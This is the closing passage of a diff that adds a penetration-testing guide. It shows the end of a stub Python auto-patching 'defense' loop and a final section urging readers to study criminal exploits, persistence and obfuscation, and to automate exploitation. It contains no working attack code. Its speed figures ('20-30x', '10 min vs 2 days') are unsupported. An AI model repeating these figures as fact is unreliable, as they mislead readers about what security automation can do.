+            # - Misconfigurations
+            # - Weak passwords
+            
+            vulnerabilities = self.scan()
+            
+            for vuln in vulnerabilities:
+                if vuln['patchable']:
+                    self.auto_patch(vuln)
+                    self.log_patch(vuln)
+            
+            time.sleep(3600)  # Every hour
+
+# Usage
+defense = AutomaticDefense()
+defense.continuous_scanning()
+```
+
+================================================================================
+FINAL SECTION: MASTERING DARK WEB TECHNIQUES & COUNTERING THEM
+================================================================================
+
+To become elite penetration tester in Tanzania, you must understand:
+
+1. What dark web hackers know that regular security people don't:
+   - Advanced evasion techniques
+   - State-of-the-art exploits
+   - Operational security
+   - Speed and efficiency
+
+2. Learn dark web techniques (for defense):
+   - Study real exploits used by criminals
+   - Understand attack chains
+   - Learn persistence mechanisms
+   - Study obfuscation techniques
+
+3. Implement superior defenses:
+   - Detect attacks faster than hackers
+   - Patch vulnerabilities before exploitation
+   - Monitor for anomalies
+   - Respond faster than attackers
+
+4. Speed mastery:
+   - Automated reconnaissance (5 min vs 5 hours)
+   - Automated exploitation (10 min vs 2 days)
+   - Automated post-exploitation (5 min vs 2 days)
+   - Automated reporting (1 min vs 1 day)
+
+Key Takeaway:
+"To beat dark web hackers, you must think like them, but code faster than them"
+
+Total automation = 20-30x speed advantage over manual attackers
+
+This transforms you from junior pentester to elite security professional
+commanding premium salary in Tanzania cybersecurity market.
+
+================================================================================
+End of Advanced Guide
+================================================================================
